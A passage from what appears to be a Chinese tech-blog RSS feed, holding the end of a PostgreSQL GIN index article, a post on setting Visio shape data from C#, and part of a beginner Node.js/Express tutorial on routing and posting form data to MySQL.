&lt;p&gt;GIN索引的插入操作与btree索引不同，对于btree索引，基表增加一行，btree索引也是增加一个索引项。而对于GIN索引基表增加一行，GIN索引可能需要增加多个索引项。所以GIN索引的插入是低效的。所以PG为了解决这个问题，实现了两种插入模式：&lt;/p&gt;
&lt;h4 id=&quot;正常模式&quot;&gt;2.4.1. 正常模式&lt;/h4&gt;
&lt;p&gt;在该模式下，基表元组产生的新的GIN索引，会被立即插入到GIN索引&lt;/p&gt;
&lt;h4 id=&quot;fastupdate模式&quot;&gt;2.4.2. fastupdate模式&lt;/h4&gt;
&lt;p&gt;在该模式下，基表元组产生的新的GIN索引，会被插入到pending list中，而pending list会在一定条件下批量的插入到GIN索引中&lt;/p&gt;
&lt;p&gt;下面就说明一下fastupdate模式的插入。&lt;/p&gt;
&lt;h5 id=&quot;开启和关闭fastupdate模式&quot;&gt;2.4.2.1 开启和关闭fastupdate模式&lt;/h5&gt;
&lt;p&gt;可以通过create index 的WITH FASTUPDATE = OFF来关闭fastupdate模式，默认情况下是开启fastupdate模式&lt;/p&gt;
&lt;h5 id=&quot;对索引扫描的影响&quot;&gt;2.4.2.2 对索引扫描的影响&lt;/h5&gt;
&lt;p&gt;在fastupdate模式下，新的索引元组以追加的方式插入到pending list中，不会进行任何的排序和去重操作，所以，在扫描时，只能顺序扫描，因此pending list的扫描效率是非常低的，必须保证pending list的大小不要太大&lt;/p&gt;
&lt;h4 id=&quot;对插入的影响&quot;&gt;2.4.2.3 对插入的影响&lt;/h4&gt;
&lt;p&gt;通常情况下，在fastupdate模式下，基表的更新效率是比较高的，但是如果一个事务的更新刚好让pending list到达临界点，而导致合并操作，则会使该事务比正常的事务慢很多&lt;/p&gt;
&lt;h4 id=&quot;pending-list的合并&quot;&gt;2.4.2.4 pending list的合并&lt;/h4&gt;
&lt;p&gt;把pending list的索引元组合并到GIN索引树上有2种触发条件：&lt;/p&gt;
&lt;p&gt;1) 当pending list所占空间大于work_mem时&lt;/p&gt;
&lt;p&gt;PS(有gin_pending_list_limit参数的版本，通过gin_pending_list_limit参数来控制，而非work_mem)&lt;/p&gt;
&lt;p&gt;2) 在vacuum 索引的基表时（包括autovacuum在内）&lt;/p&gt;
&lt;p&gt;因此可以根据autovacuum的间隔时间和work_mem来控制pending list的大小，避免其过大而拖慢扫描速度&lt;/p&gt;
&lt;p&gt;在pending list合并时，其采用与GIN索引构建时相同的方式，即先把pending list内的数据，组织成一个RB树，然后再把RB树合并到GIN索引上。RB树可以把pending list中无序的数据变成有序，并且可以合并重复key的项，提高插入效率。&lt;/p&gt;
&lt;h3 id=&quot;gin索引的vacuum&quot;&gt;2.5 GIN索引的vacuum&lt;/h3&gt;
&lt;p&gt;GIN索引的vacuum是用来清理无用的posting list或者posting tree的，GIN索引的vacuum与btree索引的vacuum一样，提供了两个接口ginbulkdelete和ginvacuumcleanup。&lt;/p&gt;
&lt;p&gt;GIN索引的vacuum主要是清理entry tree和posting tree，如果entry的posting list为空了，vacuum依然不会删除该entry，说明entry tree中的entry永远不会被删除；对于posting tree，如果posting tree也空了，在系统依然会把posting tree的root页面保留，并关联到entry上面。&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;小结&quot;&gt;3.小结&lt;/h2&gt;
&lt;p&gt;这篇文章主要开个头，同时也主要是一篇学习笔记，下一篇会多写写自己的理解，会着重从代码角度解读GIN索引以及分析实例等。&lt;/p&gt;
&lt;p&gt;敬请期待~&lt;br/&gt;引用如下：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://yq.aliyun.com/articles/69250#&quot; class=&quot;uri&quot;&gt;https://yq.aliyun.com/articles/69250#&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/maybe2030/p/4791611.html&quot; class=&quot;uri&quot;&gt;http://www.cnblogs.com/maybe2030/p/4791611.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://my.oschina.net/Kenyon/blog/366505&quot; class=&quot;uri&quot;&gt;https://my.oschina.net/Kenyon/blog/366505&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/zhangzeyuaaa/article/details/48676775&quot; class=&quot;uri&quot;&gt;http://blog.csdn.net/zhangzeyuaaa/article/details/48676775&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.chinaunix.net/uid-20726500-id-5090449.html&quot; class=&quot;uri&quot;&gt;http://blog.chinaunix.net/uid-20726500-id-5090449.html&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 13:50:00 +0000</pubDate>
<dc:creator>非我在</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/flying-tiger/p/6704931.html</dc:identifier>
</item>
<item>
<title>C# 取Visio模型信息的简易方法 - 衆尋</title>
<link>http://www.cnblogs.com/ZXdeveloper/p/7810850.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ZXdeveloper/p/7810850.html</guid>
<description>&lt;p&gt;最近的一个项目，要求导出Visio图纸，因为是建筑类的，所以，需要设置墙壁，门，房间等信息的参数。&lt;/p&gt;
&lt;p&gt;拿墙壁为例，选中墙壁模型，右键属性，会弹出以下对话框。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109180033778-315354605.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;需要设置墙长、墙壁厚度等一些列信息。&lt;/p&gt;
&lt;p&gt;现在C#操作Visio里例子比较少，所以，花了好久，都没有看到有用的帖子，直到今天下午，在Bing里发现了一个帖子，顿时让我受益匪浅。原贴地址：&lt;a href=&quot;http://mikeborozdin.com/post/reading-and-writing-visio-shape-information-with-c/&quot; target=&quot;_blank&quot;&gt;http://mikeborozdin.com/post/reading-and-writing-visio-shape-information-with-c/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;操作方法如下：&lt;/p&gt;
&lt;p&gt;一、打开Visio的开发者模式&lt;/p&gt;
&lt;p&gt;文件--选项--高级--以开发人员模式运行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109180504153-786124876.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;二、查看模型的属性&lt;/p&gt;
&lt;p&gt;选中模型--右键显示ShapeSheet，在Visio的下面就会出现模型的所有属性了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109180616138-249935346.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109180641872-1148088035.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下滑，可以在Shape Data里看到此模型的属性信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109180730200-796052121.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;三、C#代码操作&lt;/p&gt;
&lt;p&gt;1、打开墙模型模板&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109181528981-1379736247.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;WALL_M.VSS是墙的模型模板，这个推荐大家用everything搜索一下，就能拿到模板路径了，自己需要哪个去里面找。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2、建立模型并设置参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109181647403-657160864.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;建立模型很方便，就是用document.Masters属性加模型名称，模型名称在哪呢，其实很好找，就是Visio的模型名称，用汉字就可以。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109181842606-29248021.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;设置模型的参数有两种方式，图片中用粉色框，框起来的部分。&lt;/p&gt;
&lt;p&gt;网上大部分的资料里都是用的第一个方法，这个方法不太方便记忆，而第二个方法就很方便了，也就是本文介绍的简单的方式。&lt;/p&gt;
&lt;p&gt;模型名.Cells[&quot;属性名&quot;].Formula&lt;/p&gt;
&lt;p&gt;属性名，就是ShapeSheet里看到的那些属性，都是String类型，可以直接设置。设置成功以后，就是以下的图了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109182313997-1829633647.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3、遇到的问题&lt;/p&gt;
&lt;p&gt;并不是所有的属性，设置了就一定好使，问题，我也不知道出现在哪，其中一个就是填充属性。&lt;/p&gt;
&lt;p&gt;FillForegnd是填充属性，设置代码为&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
m_sp4.Cells[&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;FillForegnd&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;].Formula = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;RGB(0,0,0)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;通过参数查看，设置成功&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109182632028-1004310238.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;并且右键模型，格式--填充，如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/609679/201711/609679-20171109182752950-589412003.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其实已经设置成功了，但是模型的填充颜色不变，这个就很尴尬了，但是如果用基础模型，就是方形、圆形那些基础模型，就可以显示填充为黑色，所以不知道问题在哪里。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://files.cnblogs.com/files/ZXdeveloper/WpfApp1.zip&quot; target=&quot;_blank&quot;&gt;DEMO&lt;/a&gt;&lt;/p&gt;

</description>
<pubDate>Thu, 09 Nov 2017 10:32:00 +0000</pubDate>
<dc:creator>衆尋</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ZXdeveloper/p/7810850.html</dc:identifier>
</item>
<item>
<title>用Nodejs+Express搭建web，nodejs路由和Ajax传数据并返回状态，nodejs+mysql通过ajax获取数据并写入数据库 - 小熊一乐</title>
<link>http://www.cnblogs.com/mibear/p/nodejs.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mibear/p/nodejs.html</guid>
<description>&lt;blockquote readability=&quot;12&quot;&gt;
&lt;p&gt;小编自学Nodejs，看了好多文章发现都不全，而且好多都是一模一样的&lt;/p&gt;
&lt;p&gt;当然了，这只是基础的demo，经供参考，但是相信也会有收获&lt;/p&gt;
&lt;p&gt;今天的内容是用Nodejs+Express搭建基本的web，然后呢nodejs路由和Ajax之间的数据传输，也就是表单提交，然后在用nodejs把数据写入mysql数据库&lt;/p&gt;
&lt;p&gt;用到的东西比较多，但是还是很有趣的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;1.安装node.js&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;安装node.js，直接去官网下载然后根据需求点击下一步就好了&lt;/p&gt;
&lt;p&gt;Node.js安装包及源码下载地址为：&lt;a href=&quot;https://nodejs.org/en/download/&quot; target=&quot;_blank&quot;&gt;https://nodejs.org/en/download/&lt;/a&gt; （英文官网）&lt;/p&gt;
&lt;p&gt;&lt;a title=&quot;http://nodejs.cn/download/&quot; href=&quot;http://nodejs.cn/download/&quot; target=&quot;_blank&quot;&gt;http://nodejs.cn/download/&lt;/a&gt;（中文官网），可以下载 LTS(长期支持版本)&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;2.安装npm&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;node.js总，npm可是很重要的，NPM是随同NodeJS一起安装的包管理工具，能解决NodeJS代码部署上的很多问题，而且很多模板都是需要用这个来安装的&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;现在的版本都是已经知道npm，下面说一下需要的命令行（node.js都是用命令行来执行的--CMD）&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$ npm -v  //测试是否安装成功
2.3.0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
cnpm install npm -g  //安装淘宝镜像，即使用cnpm代替npm，都是一样的&lt;br/&gt;　　　　　　　　　　　　　　只是淘宝镜像安装会快一些，其实感觉都差不多
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;node.js很多的模块， 需要什么模块加加载对应的模块，但是模块有一些是需要&lt;strong&gt;自己安装的&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
$ npm install &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;Module &lt;/span&gt;&lt;span&gt;Name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;  //通用安装模板，Module Name是模板的名称
&lt;/pre&gt;
&lt;pre class=&quot;prettyprint&quot;&gt;
$ npm install express  //使用 npm 命令安装express(web框架)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;模块的调用，在js里面使用&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
var express = require('express');   //调用express模块
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;模块的安装有两种形式，一种时本地一种时全局（-g） ，require是调用本地的&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;npm install express         // 本地安装
npm install express -g   //全局安装&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我这里就不做多解释， 大家可以去网上看看，node.js的东西还是不少的，需要时间去学习&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;strong&gt;3.Express 搭建简单web&lt;/strong&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;什么是Express呢？&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;Express 是一个简洁而灵活的 node.js Web应用框架&lt;br/&gt;提供了一系列强大特性帮助你创建各种 Web 应用，和丰富的 HTTP 工具。
使用 Express 可以快速地搭建一个完整功能的网站。
Express 框架核心特性：
1.可以设置中间件来响应 HTTP 请求。
2.定义了路由表用于执行不同的 HTTP 请求动作。
3.可以通过向模板传递参数来动态渲染 HTML 页面。   ----引用互联网&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;之前说到，需要的模块要安装，所以这里我们要先安装这个模块&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
$ cnpm install express --save  //安装express并保存在依赖列表，可以理解为安装在本地，这样方便调用
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;当然我们还需要其他的框架，当然是否需要根据需求来&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$ cnpm install body-parser --save   //处理 JSON, Raw, Text 和 URL 编码的数据。
$ cnpm install cookie-parser --save  //解析Cookie工具,通过req.cookies取到cookie并转成对象
$ cnpm install multer --save   //用于处理 enctype=&quot;multipart/form-data&quot;（设置表单的MIME编码）的表单数据&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$ cnpm list express  //查询版本号，也是看是否安装成功
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;不多说直接上代码创建一个js文件，我这里是取名server.js&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt;var&lt;/span&gt; express = require('express'&lt;span&gt;);  //调用模块
&lt;/span&gt;&lt;span&gt;var&lt;/span&gt; app =&lt;span&gt; express();
app.get(&lt;/span&gt;'/', &lt;span&gt;function&lt;/span&gt;&lt;span&gt; (req, res) {  //get请求
   res.send(&lt;/span&gt;'Hello World'&lt;span&gt;);
})
&lt;/span&gt;&lt;span&gt;var&lt;/span&gt; server = app.listen(8888, &lt;span&gt;function&lt;/span&gt;&lt;span&gt; () {   //监听端口
  &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; host =&lt;span&gt; server.address().address
  &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; port =&lt;span&gt; server.address().port
  console.log(&lt;/span&gt;&quot;应用实例，访问地址为 http://%s:%s&quot;&lt;span&gt;, host, port)
})&lt;p&gt;当然还可以这样写&lt;br/&gt;&lt;/p&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　　 var&lt;/span&gt; express=require('express'&lt;span&gt;);
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; jqery=require('jquery'&lt;span&gt;);
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; app=&lt;span&gt;express();
      
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;主頁 get   用来处理get数据提交的路由，后门我们会说路由&lt;/span&gt;
      app.get('/',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
          console.log(&lt;/span&gt;&quot;主頁GET請求&quot;&lt;span&gt;);
          res.send(&lt;/span&gt;&quot;hello get&quot;&lt;span&gt;);
      })&lt;/span&gt;&lt;span&gt;var&lt;/span&gt; server=app.listen(8081,&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(){
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; host=&lt;span&gt;server.address().address
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; port=&lt;span&gt;server.address().port
          console.log(&lt;/span&gt;&quot;应用实例，访问地址为 http://%s:%s&quot;&lt;span&gt;, host, port);
      })&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;那么问题来了，怎么运行才是一个node.js程序呢，毕竟我们好像什么都没声明&lt;/p&gt;
&lt;p&gt;直接用cmd命令行运行这个文件  &lt;strong&gt;node server.js&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先我们的路径要是根目录，可以直接文件夹找到然后在路径栏直接写cmd，cmd将自动以当前路径开始&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109171534684-352863336.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109171410450-465308046.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109171606872-796389026.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这样就运行成功了，下面这句话是我写的，成功打印出来了，然后用浏览器打开页面，页面路径是127.0.0.1:8888&lt;/p&gt;
&lt;p&gt; 这样一个基础的web就好了&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt; 4&lt;/strong&gt;.什么是Node.js的路由 &lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 由于我们之后和ajax数据传递的时候需要用到路由，所以我们还是了解一下， 而且路由的确是很重要的，我这里简单的介绍一下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;路由决定了由谁(指定脚本)去响应客户端请求。
在HTTP请求中，我们可以通过路由提取出请求的URL以及GET&lt;/span&gt;/POST参数。
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;路由演示&lt;/span&gt;
  &lt;span&gt;function&lt;/span&gt;&lt;span&gt; route_express(){
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; express=require('express'&lt;span&gt;);
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; jqery=require('jquery'&lt;span&gt;);
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; app=&lt;span&gt;express();
      
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;主頁 get&lt;/span&gt;
      app.get('/',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
          console.log(&lt;/span&gt;&quot;主頁GET請求&quot;&lt;span&gt;);
          res.send(&lt;/span&gt;&quot;hello get&quot;&lt;span&gt;);
      })
      
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;主頁 post請求&lt;/span&gt;
      app.post('/',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
          console.log(&lt;/span&gt;&quot;主頁post請求&quot;&lt;span&gt;);
          res.send(&lt;/span&gt;&quot;hello post&quot;&lt;span&gt;);
      })
      
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;刪除頁面&lt;/span&gt;
      app.get('/del_user',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
          console.log(&lt;/span&gt;&quot;del_user get 響應要求&quot;&lt;span&gt;);
          res.send(&lt;/span&gt;&quot;刪除頁面&quot;&lt;span&gt;);
      })
      
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;用戶頁面請求&lt;/span&gt;
      app.get('/list_user',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
          console.log(&lt;/span&gt;&quot;list_user get 響應要求&quot;&lt;span&gt;);
          res.send(&lt;/span&gt;&quot;用戶頁面請求&quot;&lt;span&gt;);
      })
      
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; server=app.listen(8081,&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(){
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; host=&lt;span&gt;server.address().address
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; port=&lt;span&gt;server.address().port
          console.log(&lt;/span&gt;&quot;应用实例，访问地址为 http://%s:%s&quot;&lt;span&gt;, host, port);
      })
      
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后运行js文件，可以用过访问不同的地址得到不同的效果&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre readability=&quot;4&quot;&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;127.0.0.1:8081/list_user&lt;/span&gt;
&lt;span&gt;
http:&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;127.0.0.1:8081&lt;/span&gt;
&lt;span&gt;
http:&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span readability=&quot;2&quot;&gt;127.0.0.1:8081/del_user&lt;p&gt;会分别打印不同路由配置的文字&lt;/p&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt; 4&lt;/strong&gt;.Node.js+Express+路由+ajax 数据交互&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;上面说了那么多，现在直接上代码，关于nodejs和ajax前后台数据的交互&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;当然文件路径也很重要&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109173849200-2040935236.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;表單提價 &lt;/span&gt;
&lt;span&gt;  from_submit();  //为了方便管理我用函数包起来调用
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;表單提價 &lt;/span&gt;
  &lt;span&gt;function&lt;/span&gt;&lt;span&gt; from_submit(){
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; express = require('express'&lt;span&gt;);  //调用模板
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; app =&lt;span&gt; express();  //不污染本来，用变量来表示
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; bodyParser = require('body-parser'&lt;span&gt;);  //调用模板&lt;br/&gt;&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;創建編碼解析&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; urlencodedParser = bodyParser.urlencoded({ extended: &lt;span&gt;false&lt;/span&gt;&lt;span&gt; })
    
    app.use(express.static(&lt;/span&gt;'public'&lt;span&gt;));  //设置今天文件目录
    
    app.get(&lt;/span&gt;'/form_index.html',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
        res.sendFile(__dirname&lt;/span&gt;+&quot;/&quot;+&lt;span&gt;form_index.html); //提供静态文件
    })
    
    app.post(&lt;/span&gt;'/process_post', urlencodedParser, &lt;span&gt;function&lt;/span&gt;&lt;span&gt; (req, res) {  //post处理方法
 
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 输出 JSON 格式&lt;/span&gt;
       &lt;span&gt;var&lt;/span&gt; response =&lt;span&gt; {
           &lt;/span&gt;&quot;names&quot;&lt;span&gt;:req.body.names,   //得到页面提交的数据
           &lt;/span&gt;&quot;passwords&quot;&lt;span&gt;:req.body.passwords
       };
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;加入數據庫&lt;/span&gt;
&lt;span&gt;       mysql_connec(req.body.names,req.body.passwords);  //数据库方法，加入了两个参数，是提交的数据
       console.log(response);
          res.send(&lt;/span&gt;&quot;1&quot;&lt;span&gt;); //返回的数据，这里根据情况写
       res.end();
       
    })
    
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; server = app.listen(8888, &lt;span&gt;function&lt;/span&gt;&lt;span&gt; () {  //监听
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; host =&lt;span&gt; server.address().address
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; port =&lt;span&gt; server.address().port
    console.log(&lt;/span&gt;&quot;应用实例，访问地址为 http://%s:%s&quot;&lt;span&gt;, host, port)
    })
    
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;下面是html页面&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;src&lt;/span&gt;&lt;span&gt;=&quot;jquery-1.9.1.min.js&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt; charset&lt;/span&gt;&lt;span&gt;=&quot;utf-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
